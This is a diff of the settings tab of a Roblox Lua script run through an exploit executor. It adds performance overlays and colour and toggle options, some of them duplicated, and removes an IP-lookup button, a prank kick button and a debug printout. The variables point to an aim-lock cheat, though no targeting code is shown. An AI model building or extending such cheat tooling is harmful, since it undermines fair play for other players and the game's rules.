+local lastIter = tick() RunService.RenderStepped:Connect(function() if not (PingBox.Visible or FpsBox.Visible or MemBox.Visible) then return end local now = tick() local fps = math.floor(1 / (now - lastIter));lastIter = now local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()) local mem = math.floor(Stats:GetTotalMemoryUsageMb())  if PingBox.Visible then  PingText.Text = "Ping: " .. ping end if FpsBox.Visible then   FpsText.Text = "FPS: " .. fps end if MemBox.Visible then   MemText.Text = "Mem: " .. mem .. "MB" end PingBox.BorderColor3 = (ping > 150) and Color3.fromRGB(255, 100, 100) or Color3.fromRGB(100, 255, 100) FpsBox.BorderColor3  = (fps < 30)   and Color3.fromRGB(255, 100, 100) or Color3.fromRGB(100, 255, 100) MemBox.BorderColor3  = (mem > 1400) and Color3.fromRGB(255, 100, 100) or Color3.fromRGB(100, 255, 100) PingText.TextColor3 = PingBox.BorderColor3 FpsText.TextColor3  = FpsBox.BorderColor3 MemText.TextColor3  = MemBox.BorderColor3 end)
+-- [[ 3. RAYFIELD TOGGLES FOR INTERFACE TAB ]]
+ 
+InterfaceTab:CreateSection("Live Hardware Trackers")
 
-InterfaceTab:CreateButton({
-    Name = "kick",
-    Callback = function()
-print([[
-Lower value = smoother
-Higher value = snappier
-]])
-
-game.Players.LocalPlayer:Kick("GOT YA!")
-end})
-
-
-
-
-InterfaceTab:CreateButton({
-    Name = "⚠ Print Locals ⚠",  -- Button name
-    Callback = function()
-        print("⚠=== Local Variables ===⚠")
-        print("chanceActive             = " .. tostring(chanceActive))
-        print("chancePredictionMode     = " .. tostring(chancePredictionMode))
-        print("chanceAimDuration        = " .. tostring(chanceAimDuration))
-        print("chanceMovementThreshold  = " .. tostring(chanceMovementThreshold))
-        print("ChanceClosenesstoDisable = " .. tostring(ChanceClosenesstoDisable))
-        print("CAMSmoothing             = " .. tostring(CAMSmoothing))
-        print("HRPSmoothing             = " .. tostring(HRPSmoothing))
-        print("TargetMode               = " .. tostring(TargetMode))
-        print("CustomStudsAddedToPing   = " .. tostring(CustomStudsAddedToPing))
-        print("PingpredictionAddedSeconds " .. tostring(PingpredictionAddedSeconds))
-        print("chanceLastTriggerTime    = " .. tostring(chanceLastTriggerTime))
-        print("pingPredictionSnap       = " .. tostring(pingPredictionSnap))
-        print("pingPredictionHRP        = " .. tostring(pingPredictionHRP))
-        print("pingPredictionCam        = " .. tostring(pingPredictionCam))
-        print("⚠========================⚠")
-    end
-})
-
-
-InterfaceTab:CreateButton({
-    Name = "Print IP Info to Console", 
-    Callback = function()
-        local HttpService = game:GetService("HttpService")
-        local success, response = pcall(function()
-            -- Exploit executors usually support HttpGet or game:HttpGet
-            -- If HttpService fails, you might need to use game:HttpGet("https://ipwho.is/") instead
-            return HttpService:GetAsync("https://ipwho.is/") 
-        end)
-        
-        if success then
-            local data = HttpService:JSONDecode(response)
-            if data.success then
-                print(" ")
-                print("🌐 === LOCAL IP INFO === 🌐")
-                print("IP Address: " .. tostring(data.ip))
-                print("   Country: " .. tostring(data.country) .. " " .. tostring(data.flag.emoji))
-                print("    Region: " .. tostring(data.region))
-                print("      City: " .. tostring(data.city))
-                print("       ISP: " .. tostring(data.connection.isp))
-                print("🌐 ======================= 🌐")
-                print(" ")
-            else
-                warn("API Error: Couldn't read the IP data.")
-            end
-        else
-            warn("Request Failed: Your executor might block HttpService:GetAsync. Try using game:HttpGet() instead.")
-        end
-    end
-})
-
-local CoreGui = game:GetService("CoreGui")
-local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
-local Stats = game:GetService("Stats")
-
--- 1. Create the GUI but keep it HIDDEN at start
-local PingGui = Instance.new("ScreenGui")
-PingGui.Name = "CustomPingTracker"
-PingGui.Enabled = false -- Starts turned off!
-
-local success = pcall(function() PingGui.Parent = CoreGui end)
-if not success then PingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") end
-
--- 2. Create the draggable background frame
-local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 120, 0, 35)
-MainFrame.Position = UDim2.new(0.5, 0, 0.1, 0) 
-MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-MainFrame.BorderSizePixel = 2
-MainFrame.BorderColor3 = Color3.fromRGB(100, 167, 255) 
-MainFrame.Active = true
-MainFrame.Parent = PingGui
-
-local UICorner = Instance.new("UICorner")
-UICorner.CornerRadius = UDim.new(0, 6)
-UICorner.Parent = MainFrame
-
--- 3. Create the Text Label
-local PingLabel = Instance.new("TextLabel")
-PingLabel.Size = UDim2.new(1, 0, 1, 0)
-PingLabel.BackgroundTransparency = 1
-PingLabel.Font = Enum.Font.Code
-PingLabel.TextSize = 18
-PingLabel.Text = "Ping: -- ms"
-PingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-PingLabel.Parent = MainFrame
-
--- 4. Custom Dragging Logic 
-local dragging, dragInput, dragStart, startPos
-
-MainFrame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPos = MainFrame.Position
-
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
-        end)
-    end
-end)
-
-MainFrame.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-        dragInput = input
-    end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-    if input == dragInput and dragging then
-        local delta = input.Position - dragStart
-        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-    end
-end)
-
--- 5. Update Ping Every Frame (Optimized)
-RunService.RenderStepped:Connect(function()
-    -- Only run the math if the UI is actually turned on
-    if not PingGui.Enabled then return end 
-
-    local currentPing = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
-    PingLabel.Text = " " .. tostring(currentPing) .. " "  -- PING GUI
-    
-    if currentPing < 80 then
-        PingLabel.TextColor3 = Color3.fromRGB(100, 255, 100) 
-    elseif currentPing < 150 then
-        PingLabel.TextColor3 = Color3.fromRGB(255, 220, 100) 
-    else
-        PingLabel.TextColor3 = Color3.fromRGB(255, 100, 100) 
-    end
-end)
-
--- 6. The Rayfield Toggle
 InterfaceTab:CreateToggle({
     Name = "Show Ping Tracker",
     CurrentValue = false,
-    Flag = "PingTrackerToggle",
+    Flag = "PingToggle",
+    Callback = function(state) PingBox.Visible = state end 
+})
+
+InterfaceTab:CreateToggle({
+    Name = "Show FPS Tracker", 
+    CurrentValue = false, 
+    Flag = "FpsToggle", 
+    Callback = function(state) FpsBox.Visible = state end 
+})
+
+InterfaceTab:CreateToggle({
+    Name = "Show Memory Tracker", 
+    CurrentValue = false, 
+    Flag = "MemToggle", 
+    Callback = function(state) MemBox.Visible = state end 
+})
+
+InterfaceTab:CreateToggle({
+    Name = "Max Performance (120 FPS)", 
+    CurrentValue = false, 
+    Flag = "MaxPerfToggle", 
+    Callback = function(state) 
+        maxPerformanceActive = state 
+        if state then 
+            if setfpscap then setfpscap(120) end 
+            Rayfield:Notify({
+                Title = "Performance Mode", 
+                Content = "Aim Maxed & 120 FPS Requested", 
+                Duration = 1.5 
+            }) 
+        else 
+            if setfpscap then setfpscap(60) end 
+        end 
+    end, 
+})
+
+InterfaceTab:CreateToggle({
+    Name = "Auto Battery Saver (WIP)",
+    CurrentValue = true, 
+    Flag = "BatterySaverToggle", 
+    Callback = function(state) end,
+})
+
+ 
+
+InterfaceTab:CreateColorPicker({ 
+    Name = "Prediction Box Color", 
+    Color = Color3.fromRGB(25, 167, 255), 
+    Flag = "PredColor", 
+    Callback = function(Value) 
+        predBoxColor = Value 
+        predictionMarker.Color = Value 
+        -- Sync the UI bar color to the box color for a themed look
+        ProgressBar.BackgroundColor3 = Value
+        AimBarInner.BackgroundColor3 = Value
+    end
+})
+
+InterfaceTab:CreateSlider({
+    Name = "Box Transparency", 
+    Range = {0, 1}, 
+    Increment = 0.1, 
+    Suffix = " Alpha", 
+    CurrentValue = 0.5, 
+    Flag = "PredAlpha", 
+    Callback = function(Value) 
+        predBoxTransparency = Value 
+        if showPredictionBox or alwaysShowPredictionBox then 
+            predictionMarker.Transparency = Value 
+        end 
+    end
+})
+
+InterfaceTab:CreateToggle({
+   Name = "Show Fixed Countdown Bar",
+   CurrentValue = false,
+   Flag = "AimBarToggle",
+   Callback = function(state)
+       showProgressBar = state
+       if not state then MainBar.Visible = false end
+   end,
+})
+
+InterfaceTab:CreateToggle({
+    Name = "Show Draggable Lock Tracker",
+    CurrentValue = false,
+    Flag = "AimTrackerToggle",
     Callback = function(state)
-        PingGui.Enabled = state -- Turns the GUI on or off based on the toggle
+        showProgressBar = state
+        if not state then AimBox.Visible = false end
     end,
 })
 
-getIPInfo()
+-- [[ 2. UPDATED INTERFACE TAB TOGGLES ]]
+InterfaceTab:CreateSection("Live Hardware Trackers")
+
+InterfaceTab:CreateToggle({
+    Name = "Show Ping Tracker",
+    CurrentValue = false,
+    Flag = "PingToggle",
+    Callback = function(state) PingBox.Visible = state end 
+})
+
+InterfaceTab:CreateToggle({
+    Name = "Show FPS Tracker", 
+    CurrentValue = false, 
+    Flag = "FpsToggle", 
+    Callback = function(state) FpsBox.Visible = state end 
+})
+
+InterfaceTab:CreateToggle({
+    Name = "Show Memory Tracker", 
+    CurrentValue = false, 
+    Flag = "MemToggle", 
+    Callback = function(state) MemBox.Visible = state end 
+})
+
+InterfaceTab:CreateToggle({
+    Name = "Show Draggable Lock Tracker",
+    CurrentValue = false,
+    Flag = "AimTrackerToggle",
+    Callback = function(state)
+        showProgressBar = state
+        if not state then AimBox.Visible = false end
+    end,
+})
+
+InterfaceTab:CreateToggle({
+    Name = "Max Performance (120 FPS)", 
+    CurrentValue = false, 
+    Flag = "MaxPerfToggle", 
+    Callback = function(state) 
+        maxPerformanceActive = state 
+        if state then 
+            if setfpscap then setfpscap(120) end 
+            Rayfield:Notify({
+                Title = "Performance Mode", 
+                Content = "120 FPS Requested", 
+                Duration = 2 
+            }) 
+        else 
+            if setfpscap then setfpscap(60) end 
+        end 
+    end, 
+})
+
+InterfaceTab:CreateSection("Visual Customization")
+
+InterfaceTab:CreateColorPicker({ 
+    Name = "Theme Color", 
+    Color = Color3.fromRGB(25, 167, 255), 
+    Flag = "PredColor", 
+    Callback = function(Value) 
+        predBoxColor = Value 
+        predictionMarker.Color = Value 
+        ProgressBar.BackgroundColor3 = Value -- Syncs Fixed Bar
+        AimBarInner.BackgroundColor3 = Value -- Syncs Draggable Box
+    end
+})
+
+InterfaceTab:CreateToggle({
+   Name = "Show Fixed Countdown Bar",
+   CurrentValue = false,
+   Flag = "AimBarToggle",
+   Callback = function(state)
+       showProgressBar = state
+       if not state then MainBar.Visible = false end
+   end,
+})
+
+-- [[ 3. FINAL CONFIG LOAD ]]
 Rayfield:LoadConfiguration()
+
+
+
